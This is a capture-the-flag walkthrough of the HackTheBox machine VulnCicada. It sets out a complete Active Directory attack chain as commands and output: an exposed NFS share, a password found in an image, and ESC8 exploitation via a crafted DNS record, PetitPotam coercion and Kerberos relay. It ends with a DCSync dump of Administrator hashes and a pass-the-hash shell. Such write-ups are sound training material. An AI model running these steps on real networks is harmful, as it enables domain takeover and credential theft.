---
icon: butterfly
cover: ../../../../.gitbook/assets/Screenshot 2026-02-03 213308.png
coverY: -14.784412319296042
---

# HTB-VULNCICADA(VL)

<figure><img src="../../../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

### Reconnaissance

#### Initial Port Scan

I started with a comprehensive port scan using Rustscan to identify all open ports on the target.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/VulnCicada]
└─$ rustscan -a 10.126.221.12 blah blah 
```

**Results - 25 Open Ports:**

* **53/tcp** - DNS (Simple DNS Plus)
* **80/tcp** - HTTP (Microsoft IIS 10.0)
* **88/tcp** - Kerberos
* **111/tcp** - RPCbind
* **135/tcp** - MSRPC
* **139/tcp** - NetBIOS-SSN
* **389/tcp** - LDAP
* **445/tcp** - SMB (Microsoft-DS)
* **464/tcp** - kpasswd5
* **593/tcp** - HTTP-RPC-EPMAP
* **636/tcp** - LDAPS
* **2049/tcp** - NFS
* **3268/tcp** - Global Catalog LDAP
* **3269/tcp** - Global Catalog LDAPS
* **3389/tcp** - RDP (MS Terminal Services)
* **5357/tcp** - WS-Discovery
* **5985/tcp** - WinRM
* **9389/tcp** - ADWS (.NET Message Framing)

**Findings:**

* Target is a **Windows Domain Controller**
* **Domain:** cicada.vl
* **Hostname:** DC-JPQ225.cicada.vl
* **NTLM Authentication:** Disabled (Kerberos only)
* **OS:** Windows Server (based on IIS 10.0)

#### Hosts File Configuration

I used netexec to generate a proper hosts file entry:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/VulnCicada]
└─$ netexec smb 10.126.221.12 --generate-hosts-file hosts

┌──(sn0x㉿sn0x)-[~/HTB/VulnCicada]
└─$ cat hosts
10.126.221.12     DC-JPQ225.cicada.vl cicada.vl DC-JPQ225

┌──(sn0x㉿sn0x)-[~/HTB/VulnCicada]
└─$ cat hosts /etc/hosts | sponge /etc/hosts
```

***

### Enumeration

#### HTTP (Port 80)

The web server showed only the default IIS landing page with no interesting content.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/VulnCicada]
└─$ feroxbuster -u http://10.126.221.12 -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
```

Directory brute-forcing revealed nothing of value - only the default IIS files (`iisstart.htm`, `iisstart.png`).

#### SMB (Port 445)

Initial SMB enumeration confirmed the domain information but showed NTLM is disabled:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/VulnCicada]
└─$ netexec smb DC-JPQ225.cicada.vl -u guest -p ''
SMB         10.126.221.12   445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.126.221.12   445    DC-JPQ225        [-] cicada.vl\guest: STATUS_NOT_SUPPORTED
```

Attempts to authenticate with Kerberos using dummy accounts failed:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/VulnCicada]
└─$ netexec smb DC-JPQ225.cicada.vl -u guest -p '' -k
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\guest: KDC_ERR_CLIENT_REVOKED
```

#### NFS (Port 2049)

**Major Discovery:** An NFS share was exposed publicly!

```bash
┌──(sn0x㉿sn0x)-[~/HTB/VulnCicada]
└─$ showmount -e 10.126.221.12
Export list for 10.126.221.12:
/profiles (everyone)
```

I mounted the share to examine its contents:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/VulnCicada]
└─$ sudo mount -t nfs -o rw 10.126.221.12:/profiles /mnt

┌──(sn0x㉿sn0x)-[~/HTB/VulnCicada]
└─$ ls /mnt
Administrator    Debra.Wright  Jordan.Francis  Katie.Ward     Richard.Gibbons  Shirley.West
Daniel.Marshall  Jane.Carter   Joyce.Andrews   Megan.Simpson  Rosie.Powell
```

The NFS share appeared to be the `C:\Users` directory from the domain controller, containing home directories for multiple domain users.

**Searching for Files:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/VulnCicada]
└─$ find /mnt -type f -ls
```

**Found Two Image Files:**

1. `/mnt/Administrator/vacation.png` - Accessible
2. `/mnt/Rosie.Powell/marketing.png` - Required sudo to copy

```bash
┌──(sn0x㉿sn0x)-[~/HTB/VulnCicada]
└─$ cp /mnt/Administrator/vacation.png .

┌──(sn0x㉿sn0x)-[~/HTB/VulnCicada]
└─$ sudo cp /mnt/Rosie.Powell/marketing.png .
```

**Critical Finding:**\
The `marketing.png` image showed a woman at a desk with a **sticky note containing a password visible in the image: "Cicada123"**

***

### Initial Access - User Rosie.Powell

#### Credential Discovery

Based on the image location (`/mnt/Rosie.Powell/`), I tested the credentials:

* **Username:** Rosie.Powell
* **Password:** Cicada123

#### Authentication Verification

```bash
┌──(sn0x㉿sn0x)-[~/HTB/VulnCicada]
└─$ netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123
```

Success! The credentials are valid for Kerberos authentication.

#### SMB Share Enumeration

```bash
┌──(sn0x㉿sn0x)-[~/HTB/VulnCicada]
└─$ netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k --shares
```

**Accessible Shares:**

* **ADMIN$** - No access
* **C$** - No access
* **CertEnroll** - READ (Active Directory Certificate Services)
* **IPC$** - READ
* **NETLOGON** - READ
* **profiles$** - READ, WRITE (Same as NFS share)
* **SYSVOL** - READ

**Key Discovery:** The `CertEnroll` share indicates **Active Directory Certificate Services (ADCS)** is installed.

#### Generating Kerberos TGT

```bash
┌──(sn0x㉿sn0x)-[~/HTB/VulnCicada]
└─$ netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k --generate-tgt Rosie.Powell
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] TGT saved to: Rosie.Powell.ccache
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] Run the following command to use the TGT: export KRB5CCNAME=Rosie.Powell.ccache
```

#### Exploring Shares

```bash
┌──(sn0x㉿sn0x)-[~/HTB/VulnCicada]
└─$ KRB5CCNAME=Rosie.Powell.ccache smbclient.py -k DC-JPQ225.cicada.vl
```

The `CertEnroll` share contained numerous certificates and certificate revocation lists (CRLs), confirming ADCS is active.

***

### Privilege Escalation - ADCS Exploitation

#### ADCS Vulnerability Scanning

With ADCS present, I used Certipy to scan for vulnerabilities:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/VulnCicada]
└─$ certipy find -target DC-JPQ225.cicada.vl -u Rosie.Powell@cicada.vl -p Cicada123 -k -vulnerable -stdout
```

**Critical Finding: ESC8 Vulnerability Detected**

```
[!] Vulnerabilities
  ESC8                              : Web Enrollment is enabled over HTTP.
```

**ESC8 Details:**

* Certificate Authority: cicada-DC-JPQ225-CA
* Web Enrollment enabled over insecure HTTP
* Allows NTLM relay attacks against the CA

#### Understanding ESC8

ESC8 is a privilege escalation attack that involves:

1. **Coercing Authentication** - Force the DC machine account to authenticate to attacker
2. **NTLM Relay** - Relay the authentication to the ADCS HTTP endpoint
3. **Certificate Request** - Request a certificate as the DC machine account
4. **Authentication** - Use the certificate to authenticate as the DC
5. **Hash Dump** - Extract domain admin credentials

#### Exploitation Strategy

Due to NTLM being disabled, I needed to use a Kerberos relay attack. The technique involves:

1. Creating a malicious DNS record with a crafted SPN
2. Coercing the DC to authenticate to this record
3. Relaying the Kerberos authentication to ADCS
4. Obtaining a certificate for the DC machine account

#### Step 1: Create Malicious DNS Record

The DNS record format is `<hostname><empty CREDENTIAL_TARGET_INFORMATION structure>`:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/VulnCicada]
└─$ bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.16.21
[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
```

This creates a DNS record that will:

* Trick the DC into requesting a Kerberos ticket for the machine account
* Point to our attacker IP (10.10.16.21)

#### Step 2: Start Certipy Relay

```bash
┌──(sn0x㉿sn0x)-[~/HTB/VulnCicada]
└─$ certipy relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController
Certipy v5.0.3 - by Oliver Lyak (ly4k)
[*] Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
```

#### Step 3: Identify Coercion Method

Check which coercion techniques work:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/VulnCicada]
└─$ netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M coerce_plus
```

**Available Methods:**

* DFSCoerce - VULNERABLE
* **PetitPotam - VULNERABLE** (Most reliable)
* PrinterBug - VULNERABLE

#### Step 4: Trigger Coercion with PetitPotam

```bash
┌──(sn0x㉿sn0x)-[~/HTB/VulnCicada]
└─$ netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

#### Step 5: Certificate Obtained

Back at the Certipy relay window:

```
[*] SMBD-Thread-2 (process_request_thread): Received connection from 10.126.221.12, attacking target http://dc-jpq225.cicada.vl
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] Authenticating against http://dc-jpq225.cicada.vl as / SUCCEED
[*] Requesting certificate for '\\' based on the template 'DomainController'
[*] Certificate issued with request ID 95
[*] Got certificate with DNS Host Name 'DC-JPQ225.cicada.vl'
[*] Certificate object SID is 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Saving certificate and private key to 'dc-jpq225.pfx'
[*] Wrote certificate and private key to 'dc-jpq225.pfx'
```

**Success!** We now have a certificate for the DC machine account.

***

### Domain Compromise

#### Authenticate with Certificate

Using the obtained certificate to authenticate as the DC machine account:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/VulnCicada]
└─$ certipy auth -pfx dc-jpq225.pfx -dc-ip 10.126.221.12
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
[*] Wrote credential cache to 'dc-jpq225.ccache'
[*] Trying to retrieve NT hash for 'dc-jpq225$'
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
```

**Obtained:**

* Kerberos TGT for DC-JPQ225$
* NTLM hash for the machine account

#### Dump Domain Administrator Hash

Using the DC machine account TGT to perform a DCSync attack:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/VulnCicada]
└─$ KRB5CCNAME=dc-jpq225.ccache secretsdump.py -k -no-pass cicada.vl/dc-jpq225\$@dc-jpq225.cicada.vl -just-dc-user administrator
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a
Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4
Administrator:des-cbc-md5:fd2a29621f3e7604
```

**Administrator NTLM Hash:** 85a0da53871a9d56b6cd05deda3a5e87

#### Verify Administrator Access

```bash
┌──(sn0x㉿sn0x)-[~/HTB/VulnCicada]
└─$ netexec smb dc-jpq225.cicada.vl -u administrator -H 85a0da53871a9d56b6cd05deda3a5e87 -k
SMB         dc-jpq225.cicada.vl 445    dc-jpq225        [+] cicada.vl\administrator:85a0da53871a9d56b6cd05deda3a5e87 (Pwn3d!)
```

Perfect! Full domain administrator access confirmed.

***

### Getting Administrator Shell

#### WMIExec Shell

```bash
┌──(sn0x㉿sn0x)-[~/HTB/VulnCicada]
└─$ wmiexec.py cicada.vl/administrator@dc-jpq225.cicada.vl -k -hashes :85a0da53871a9d56b6cd05deda3a5e87
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
cicada\administrator
```

***
